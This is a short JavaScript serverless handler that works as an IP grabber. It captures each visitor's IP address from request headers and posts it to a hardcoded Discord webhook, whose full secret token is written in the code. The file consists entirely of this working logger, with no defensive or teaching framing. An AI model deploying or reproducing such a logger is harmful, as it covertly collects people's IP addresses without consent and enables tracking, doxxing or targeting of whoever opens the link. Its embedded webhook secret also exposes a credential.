export default async function handler(req, res) {
  const ip =
    req.headers['x-forwarded-for'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'Unknown IP';

  // Discord webhook URL
  const webhookURL = "https://discord.com/api/webhooks/1420217270629695500/l1c7HRvL9BRkXifKcAmD4BT_C5F4_tCQYEsX6iTlpQLw11JOaQqMCPFBz9thCB3kOD_W";

  try {
    // Send IP to Discord webhook
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `New visitor IP: ${ip}`
      })
    });

    console.log('IP sent to Discord:', ip);
    res.status(200).send('IP sent to Discord!');
  } catch (err) {
    console.error('Error sending IP:', err);
    res.status(500).send('Failed to send IP.');
  }
}
